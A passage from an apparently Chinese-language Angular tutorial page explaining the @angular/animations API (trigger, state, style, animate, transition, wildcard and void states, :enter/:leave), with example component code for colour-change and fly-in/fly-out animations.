    <span class="token keyword">this</span><span class="token punctuation">.</span>host<span class="token punctuation">.</span>nativeElement<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'src'</span><span class="token punctuation">,</span> src<span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><p>此外，对于使用 Ionic 或 Cordova 项目来说，可以使用 <a href="https://github.com/apache/cordova-plugin-network-information" target="_blank" rel="noopener noreferrer">cordova-plugin-network-information<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 这个库来获取网络信息</p> <h2 id="animation"><a href="#animation" class="header-anchor">#</a> animation</h2> <p>Angular动画定义在组件装饰器的animations属性中。Angular 自定义了一套动画描述语言(DSL)，用于映射CSS3动画，过度，变换操作。在使用时则是调用一系列动画函数。通过查看动画相关的api，可以发现一共有3个抽象类AnimationMetadata，AnimationStateMetadata和AnimationWithStepsMetadata，其中AnimationWithStepsMetadata扩展了AnimationStateMetadata 抽象类。</p> <p>Angular 主要的动画模块是 @angular/animations 和 @angular/platform-browser。当使用Angular / cli 创建新项目时，这些依赖会自动添加到项目中。</p> <p>基于 Web 动画 API 构建，而不支持 WAAPI 的浏览器，则需要引入 <a href="https://github.com/web-animations/web-animations-js" target="_blank" rel="noopener noreferrer">web-animations.min.js<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg></a> 作为 polyfill</p> <h3 id="定义类和实现函数"><a href="#定义类和实现函数" class="header-anchor">#</a> 定义类和实现函数</h3> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token parameter">trigger</span> <span class="token operator">=&gt;</span> AnimationEntryMetadata
<span class="token parameter">state</span>   <span class="token operator">=&gt;</span> AnimationStateDeclarationMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationStateMetadata</span>
<span class="token parameter">transition</span> <span class="token operator">=&gt;</span> AnimationStateTransitionMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationStateMetadata</span>
<span class="token parameter">keyframes</span> <span class="token operator">=&gt;</span> AnimationKeyframesSequenceMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationMetadata</span>
<span class="token parameter">style</span> <span class="token operator">=&gt;</span> AnimationStyleMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationMetadata</span>
<span class="token parameter">animate</span> <span class="token operator">=&gt;</span> AnimationAnimateMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationMetadata</span>
<span class="token parameter">sequence</span> <span class="token operator">=&gt;</span> AnimationSequenceMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationWithStepsMetadata</span>
<span class="token parameter">group</span> <span class="token operator">=&gt;</span> AnimationGroupMetadata <span class="token keyword">extends</span> <span class="token class-name">AnimationWithStepsMetadata</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><blockquote><p>使用方式</p></blockquote> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token operator">|</span>- trigger<span class="token punctuation">[</span><span class="token punctuation">]</span>
  <span class="token operator">|</span>- state
    <span class="token operator">|</span>- style
  <span class="token operator">|</span>- transition
    <span class="token operator">|</span>- style
    <span class="token operator">|</span>- animate
      <span class="token operator">|</span>- style
      <span class="token operator">|</span>- keyframes
    <span class="token operator">|</span>- keyframes<span class="token punctuation">[</span><span class="token punctuation">]</span>
      <span class="token operator">|</span>- style
    <span class="token operator">|</span>- sequence <span class="token comment"># 可以嵌套</span>
      <span class="token operator">|</span>- style
      <span class="token operator">|</span>- animate
      <span class="token operator">|</span>- sequence
      <span class="token operator">|</span>- group
    <span class="token operator">|</span>- group <span class="token comment"># 可以嵌套</span>
      <span class="token operator">|</span>- style
      <span class="token operator">|</span>- animate
      <span class="token operator">|</span>- sequence
      <span class="token operator">|</span>- group
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br></div></div><h3 id="动画函数"><a href="#动画函数" class="header-anchor">#</a> 动画函数</h3> <p>我们用一个例子来说明<code>trigger/state/style/animate/transition</code>：</p> <h4 id="创建组件引入动画函数"><a href="#创建组件引入动画函数" class="header-anchor">#</a> 创建组件引入动画函数</h4> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// ng g c animationDemo</span>
<span class="token keyword">import</span> <span class="token punctuation">{</span>trigger<span class="token punctuation">,</span> state<span class="token punctuation">,</span> style<span class="token punctuation">,</span> animate<span class="token punctuation">,</span> transition<span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'@angular/animations'</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h4 id="添加动画属性-转场"><a href="#添加动画属性-转场" class="header-anchor">#</a> 添加动画属性/转场</h4> <p>在模版文件（HTML文件）中，有一个元素，它有两种状态，第一种状态名称叫做：“isYellow”；第二种状态叫做：“isGreen”,通过一个按钮去控制这个元素在这种个状态的变化。</p> <ol><li>在“isYellow”这种状态的时候，样式为：长200px；宽200px；背景色黄色；透明度为1；</li> <li>在“isGreen”这种状态的时候，样式为：长100px；宽100px；背景色绿色；透明度为0.5；</li></ol> <div class="language-js line-numbers-mode"><pre class="language-js"><code>    animations<span class="token operator">:</span> <span class="token punctuation">[</span>
          <span class="token comment">// 定义动画的触发器放在 animations 元数据属性中</span>
           <span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'stateChange'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
             <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isYellow'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
               <span class="token punctuation">{</span>
                 height<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
                 width<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
                 opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
                 backgroundColor<span class="token operator">:</span> <span class="token string">'yellow'</span>
               <span class="token punctuation">}</span>
             <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
             <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isGreen'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
               <span class="token punctuation">{</span>
                 height<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
                 width<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
                 opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
                 backgroundColor<span class="token operator">:</span> <span class="token string">'green'</span>
               <span class="token punctuation">}</span>
             <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
             <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow =&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
             <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isGreen =&gt; isYellow'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br></div></div><ul><li>定义“isYellow” 和“isGreen”这两种状态,使用style()函数为每个状态增加样式</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>注意，<code>style()</code>函数中样式的属性必须是小驼峰格式的。</p></div> <ul><li>使用transition() 就可以完成这种过渡的转换，它接受两个参数：第一个参数接受一个表达式，它定义两个转场状态之间的方向；第二个参数接受一个 animate() 函数。来定义长度、延迟和缓动效果，并指定一个样式函数，以定义转场过程中的样式。 对于多步骤的动画，还可以使用 animate() 函数来为多步动画定义keyframes() 函数。不过这些定义要放在 animate()函数的第二个参数中。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>animate() 函数（作为转场函数的第二个参数）可以接受 timings 和 styles 参数。</p> <ul><li>timings 参数接受一个由三部分组成的字符串。 ('duration delay easing')
<ul><li>第一个参数 duration（持续时间）是必须的。这个持续时间可以表示成一个不带引号的纯数字（表示毫秒），或一个带引号的有单位的时间（表示秒数）。比如，0.1 秒的持续时间有如下表示方式：
<ul><li>作为纯数字，毫秒为单位：100</li> <li>作为字符串，毫秒为单位：'100ms'</li> <li>作为字符串，秒为单位：'0.1s'</li></ul></li> <li>第二个参数 delay 的语法和 duration 一样。比如：
<ul><li>等待 100 毫秒，然后运行 200 毫秒表示为：'0.2s 100ms'</li></ul></li> <li>第三个参数 easing控制动画在运行期间如何进行加速和减速。比如 ease-in 表示动画开始时很慢，然后逐渐加速。
注意：=&gt; 操作符表示单向转场，而 &lt;=&gt; 表示双向转场；</li></ul></li></ul></div> <ul><li>trigger()函数会把一些状态和转场组合在一下，并命名这个动画名称，从而就可以在HTML模版文件中的元素上使用了。trigger() 函数描述了监听变化时要使用的触发器名称。当这个触发器名称所绑定的值发生了变化时，触发器就会启动它所定义的操作。</li></ul> <h4 id="绑定模版元素"><a href="#绑定模版元素" class="header-anchor">#</a> 绑定模版元素</h4> <p>在这里定一个button，并绑定一个点击事件，来改变触发器监听的值。</p> <div class="language- line-numbers-mode"><pre class="language-text"><code>// html
&lt;div [@stateChange]=&quot;isChange?'isYellow':'isGreen'&quot;&gt;
  &lt;p&gt;
    Angular学习笔记
  &lt;/p&gt;
&lt;/div&gt;
&lt;button nz-button (click)=&quot;handleChange()&quot;&gt;改变状态&lt;/button&gt;
// ts
import {Component, OnInit} from '@angular/core';
import {trigger, state, style, animate, transition} from '@angular/animations';
@Component({
  selector: 'app-animation-demo',
  templateUrl: './animation-demo.component.html',
  styleUrls: ['./animation-demo.component.less'],
  animations: [
    // 定义动画的触发器放在 animations 元数据属性中
    trigger('stateChange', [
      state('isYellow', style(
        {
          height: '200px',
          width: '200px',
          opacity: 1,
          backgroundColor: 'yellow'
        }
      )),
      state('isGreen', style(
        {
          height: '100px',
          width: '100px',
          opacity: 0.5,
          backgroundColor: 'green'
        }
      )),
      transition('isYellow =&gt; isGreen', animate('1s')),
      transition('isGreen =&gt; isYellow', animate('2s')),
    ])
  ],
})
export class AnimationDemoComponent implements OnInit {
  public isChange = false;
  constructor() {
  }
  ngOnInit() {
  }
  public handleChange(): void {
    this.isChange = !this.isChange;
  }
}
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br></div></div><p>运行，打开浏览器可以看到如下效果：</p> <p><img src="/vuebloger/img/post/20190320204432394.gif" alt=""></p> <h3 id="通配符-与void"><a href="#通配符-与void" class="header-anchor">#</a> 通配符*与void</h3> <p>当不在乎这个元素的结束状态或者开始状态的时候，就可以使用 “*” 这个通配符。在做动画的时候，会遇到，对于某一个元素，会有不止两个的状态，例如如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code>animations<span class="token operator">:</span> <span class="token punctuation">[</span>
  <span class="token comment">// 定义动画的触发器放在 animations 元数据属性中*</span>
<span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'stateChange'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isYellow'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
      <span class="token punctuation">{</span>
        height<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
        width<span class="token operator">:</span> <span class="token string">'200px'</span><span class="token punctuation">,</span>
        opacity<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'yellow'</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isGreen'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
      <span class="token punctuation">{</span>
        height<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
        width<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
        opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'green'</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'isRed'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span>
      <span class="token punctuation">{</span>
        height<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
        width<span class="token operator">:</span> <span class="token string">'100px'</span><span class="token punctuation">,</span>
        opacity<span class="token operator">:</span> <span class="token number">0.5</span><span class="token punctuation">,</span>
        backgroundColor<span class="token operator">:</span> <span class="token string">'red'</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow =&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isGreen =&gt; isYellow'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br></div></div><p>假设需要 isYellow 的状态和 isGreen 的状态相互转换的时候，都需要1s时间，正常情况如下写：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow =&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isGreen =&gt; isYellow'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>此时就可以使用双向箭头语法(&lt;=&gt;),从而指定任意方向的转场,故上面的代码可以简化为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow &lt;=&gt; isGreen'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'1s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这个时候，在状态于状态之间转换的时间是设定这里,在这个元素向isRed这个状态的时候，都需要0.5s转场时间，这个时候，就不用去写如下：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isYellow =&gt; isRed'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'0.5s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
<span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'isGreen =&gt; isRed'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'0.5s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这个时候就可以使用通配符了，故上面的代码就可以简化为：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; isRed'</span><span class="token punctuation">,</span> <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'0.5s'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>Void状态来为进入或离开页面的元素配置转场，也可以理解为：将元素从DOM中插入或者删除。</p> <p>组合使用通配符(*)和void状态你可以在转场中组合使用通配符和void状态，以触发那些进入和离开页面的动画：</p> <ul><li>当元素离开视图时(这个元素从DOM删除的时候)，就会触发* =&gt; void转场，而不管它离开前处于什么状态。</li> <li>当元素进入视图时(这个元素被插入到DOM的时候)，就会触发void =&gt; *转场，而不管它进入时处于什么状态。</li></ul> <div class="custom-block tip"><p class="custom-block-title">温馨提示</p> <p>通配符状态(*)会匹配任何状态(包括void)。</p></div> <p>现在来做一个将一个元素插入DOM的时候从左飞入，删除DOM的时候，从右边飞出的动画</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token comment">// html</span>
<span class="token operator">&lt;</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>button nz<span class="token operator">-</span><span class="token function">button</span> <span class="token punctuation">(</span>click<span class="token punctuation">)</span><span class="token operator">=</span><span class="token string">&quot;handleInOut()&quot;</span><span class="token operator">&gt;</span>按钮<span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control nzSpan<span class="token operator">=</span><span class="token string">&quot;10&quot;</span> nzOffset<span class="token operator">=</span><span class="token string">&quot;7&quot;</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>div style<span class="token operator">=</span><span class="token string">&quot;text-align: center;background: red&quot;</span> <span class="token operator">*</span>ngIf<span class="token operator">=</span><span class="token string">&quot;isInOut&quot;</span>  <span class="token punctuation">[</span>@fly<span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">&quot;isInOut?'flyIn':'void'&quot;</span><span class="token operator">&gt;</span>
      飞入飞出动画～
    <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>form<span class="token operator">-</span>control<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>nz<span class="token operator">-</span>row<span class="token operator">&gt;</span>
<span class="token comment">// 将上述添加到一个触发器中：</span>
<span class="token function">trigger</span><span class="token punctuation">(</span><span class="token string">'fly'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
  <span class="token function">state</span><span class="token punctuation">(</span><span class="token string">'flyIn'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
    transform<span class="token operator">:</span> <span class="token string">'translateX(0)'</span><span class="token punctuation">,</span>
    color<span class="token operator">:</span> <span class="token string">'blue'</span><span class="token punctuation">,</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'void =&gt; *'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      transform<span class="token operator">:</span> <span class="token string">'translateX(-100%)'</span><span class="token punctuation">,</span>
      color<span class="token operator">:</span> <span class="token string">'yellow'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">)</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">'* =&gt; void'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
    <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">,</span> <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
      transform<span class="token operator">:</span> <span class="token string">'translateX(100%)'</span><span class="token punctuation">,</span>
      color<span class="token operator">:</span> <span class="token string">'red'</span>
    <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
  <span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token comment">// 在类文件中增加一个属性来控制元素的插入和删除</span>
<span class="token keyword">export</span> <span class="token keyword">class</span> <span class="token class-name">AnimationDemoComponent</span>  <span class="token keyword">implements</span> <span class="token class-name">OnInit</span> <span class="token punctuation">{</span>
  <span class="token keyword">public</span> isChange <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
  <span class="token keyword">public</span> isInOut <span class="token operator">=</span>  <span class="token boolean">false</span><span class="token punctuation">;</span>

  <span class="token function">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>

  <span class="token function">ngOnInit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token function">handleChange</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token operator">:</span>  <span class="token keyword">void</span><span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isChange <span class="token operator">=</span> state<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

  <span class="token keyword">public</span> <span class="token function">handleInOut</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">this</span><span class="token punctuation">.</span>isInOut <span class="token operator">=</span> <span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>isInOut<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>

<span class="token punctuation">}</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br><span class="line-number">28</span><br><span class="line-number">29</span><br><span class="line-number">30</span><br><span class="line-number">31</span><br><span class="line-number">32</span><br><span class="line-number">33</span><br><span class="line-number">34</span><br><span class="line-number">35</span><br><span class="line-number">36</span><br><span class="line-number">37</span><br><span class="line-number">38</span><br><span class="line-number">39</span><br><span class="line-number">40</span><br><span class="line-number">41</span><br><span class="line-number">42</span><br><span class="line-number">43</span><br><span class="line-number">44</span><br><span class="line-number">45</span><br><span class="line-number">46</span><br><span class="line-number">47</span><br><span class="line-number">48</span><br><span class="line-number">49</span><br><span class="line-number">50</span><br><span class="line-number">51</span><br></div></div><h3 id="enter-leave"><a href="#enter-leave" class="header-anchor">#</a> :enter/:leave</h3> <p>在Angular中:enter 和 :leave 分别是 void =&gt; * 和 * =&gt; void 的别名。所以之前的代码就也可以写成：</p> <div class="language-js line-numbers-mode"><pre class="language-js"><code><span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">':enter'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
        <span class="token function">style</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
          transform<span class="token operator">:</span> <span class="token string">'translateX(-100%)'</span><span class="token punctuation">,</span>
          color<span class="token operator">:</span> <span class="token string">'yellow'</span>
        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token function">animate</span><span class="token punctuation">(</span><span class="token string">'2s'</span><span class="token punctuation">)</span>
      <span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
      <span class="token function">transition</span><span class="token punctuation">(</span><span class="token string">':leave'</span><span class="token punctuation">,</span> <span class="token punctuation">[</span>
